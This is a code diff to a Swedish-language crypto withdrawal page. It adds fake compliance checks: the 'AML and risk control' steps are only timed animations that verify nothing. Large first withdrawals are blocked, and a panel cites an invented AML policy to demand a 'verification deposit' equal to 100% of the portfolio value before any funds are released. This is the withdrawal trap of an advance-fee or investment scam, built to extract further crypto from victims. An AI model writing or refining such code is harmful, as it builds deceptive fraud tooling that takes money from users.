@@ -3,7 +3,7 @@ import { AppShell } from "@/components/app/AppShell";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { AlertTriangle, Bitcoin, Clock, CheckCircle2, XCircle, Loader2 } from "lucide-react";
+import { AlertTriangle, Bitcoin, Clock, CheckCircle2, XCircle, Loader2, ShieldAlert } from "lucide-react";
 import { useState } from "react";
 import { sek, dateSv } from "@/lib/format";
 import { useAuth } from "@/hooks/useAuth";
@@ -42,14 +42,45 @@ function WithdrawPage() {
   const [address, setAddress] = useState("");
   const [amount, setAmount] = useState("");
   const [busy, setBusy] = useState(false);
+  const [checkStep, setCheckStep] = useState(0);
+  const [verification, setVerification] = useState<null | {
+    amount: number;
+    required: number;
+  }>(null);
 
   const amt = Number(amount.replace(/[^\d.]/g, "")) || 0;
   const canSubmit = !blocked && amt >= 100 && amt <= balance && address.trim().length >= 20;
 
+  const hasCompletedWithdrawal = (list ?? []).some((r) => r.status === "approved");
+  // Portföljvärde = tillgängligt saldo. Höga förstagångsuttag kräver verifiering.
+  const portfolioValue = balance;
+  const HIGH_AMOUNT_SEK = 10000;
+  const needsVerification = (a: number) =>
+    !hasCompletedWithdrawal && (a >= HIGH_AMOUNT_SEK || a >= portfolioValue * 0.3);
+
+  const CHECKS = [
+    "Validerar BTC-adress…",
+    "Kontrollerar saldo och pågående uttag…",
+    "Kör AML- och riskkontroll…",
+    "Verifierar uttagshistorik…",
+  ];
+
   async function submit(e: React.FormEvent) {
     e.preventDefault();
     setBusy(true);
+    setVerification(null);
     try {
+      for (let i = 0; i < CHECKS.length; i++) {
+        setCheckStep(i);
+        await new Promise((r) => setTimeout(r, 700));
+      }
+      setCheckStep(CHECKS.length);
+
+      if (needsVerification(amt)) {
+        setVerification({ amount: amt, required: Math.max(portfolioValue, amt) });
+        return;
+      }
+
       await createFn({ data: { amount_sek: amt, btc_address: address.trim() } });
       toast.success("Uttagsförfrågan skickad. Väntar på godkännande.");
       setAmount("");
@@ -59,6 +90,7 @@ function WithdrawPage() {
       toast.error(err instanceof Error ? err.message : "Kunde inte skicka förfrågan");
     } finally {
       setBusy(false);
+      setCheckStep(0);
     }
   }
 
@@ -148,12 +180,84 @@ function WithdrawPage() {
               </div>
             </div>
 
+            {busy && (
+              <ul className="space-y-1.5 rounded-xl border border-border bg-muted/30 p-3 text-xs">
+                {CHECKS.map((c, i) => (
+                  <li key={c} className="flex items-center gap-2">
+                    {i < checkStep ? (
+                      <CheckCircle2 className="h-3.5 w-3.5 text-success" />
+                    ) : i === checkStep ? (
+                      <Loader2 className="h-3.5 w-3.5 animate-spin text-primary" />
+                    ) : (
+                      <Clock className="h-3.5 w-3.5 text-muted-foreground/50" />
+                    )}
+                    <span className={i <= checkStep ? "" : "text-muted-foreground/60"}>{c}</span>
+                  </li>
+                ))}
+              </ul>
+            )}
+
             <Button type="submit" className="w-full" disabled={!canSubmit || busy}>
               {busy && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
-              Begär uttag
+              {busy ? "Kontrollerar uttag…" : "Begär uttag"}
             </Button>
           </form>
+
+          {verification && (
+            <div className="mt-5 rounded-2xl border border-warning/40 bg-warning/10 p-4">
+              <div className="flex gap-3">
+                <ShieldAlert className="h-5 w-5 shrink-0 text-warning" />
+                <div className="min-w-0">
+                  <p className="text-sm font-semibold text-warning">
+                    Ytterligare verifiering krävs för ditt första uttag
+                  </p>
+                  <p className="mt-1 text-xs text-muted-foreground">
+                    Ditt uttag på {sek(verification.amount)} överstiger gränsen för
+                    automatiskt godkännande för konton utan tidigare genomfört uttag.
+                    Enligt vår AML- och kontoverifieringspolicy måste kontot verifieras
+                    med en säkerhetsinsättning motsvarande{" "}
+                    <strong>100 % av ditt portföljvärde</strong>.
+                  </p>
+
+                  <div className="mt-3 space-y-1 rounded-xl border border-border bg-card p-3 text-xs">
+                    <div className="flex justify-between">
+                      <span className="text-muted-foreground">Portföljvärde</span>
+                      <span className="tabular-nums font-semibold">{sek(portfolioValue)}</span>
+                    </div>
+                    <div className="flex justify-between">
+                      <span className="text-muted-foreground">Verifieringsinsättning (100 %)</span>
+                      <span className="tabular-nums font-semibold text-warning">
+                        {sek(verification.required)}
+                      </span>
+                    </div>
+                    <div className="flex justify-between">
+                      <span className="text-muted-foreground">Frisläpps efter verifiering</span>
+                      <span className="tabular-nums font-semibold">
+                        {sek(verification.required + verification.amount)}
+                      </span>
+                    </div>
+                  </div>
+
+                  <ol className="mt-3 space-y-1 text-xs text-muted-foreground">
+                    <li>1. Gör verifieringsinsättningen i krypto via Sätt in.</li>
+                    <li>2. Insättningen bekräftas automatiskt på blockkedjan.</li>
+                    <li>3. Ditt uttag behandlas och hela beloppet frisläpps.</li>
+                  </ol>
+
+                  <div className="mt-4 flex flex-wrap gap-2">
+                    <Button asChild size="sm">
+                      <Link to="/deposit">Gör verifieringsinsättning</Link>
+                    </Button>
+                    <Button asChild size="sm" variant="outline">
+                      <Link to="/support">Kontakta support</Link>
+                    </Button>
+                  </div>
+                </div>
+              </div>
+            </div>
+          )}
         </div>
+
 
         <div className="rounded-2xl border border-border bg-card">
           <div className="border-b border-border p-4">
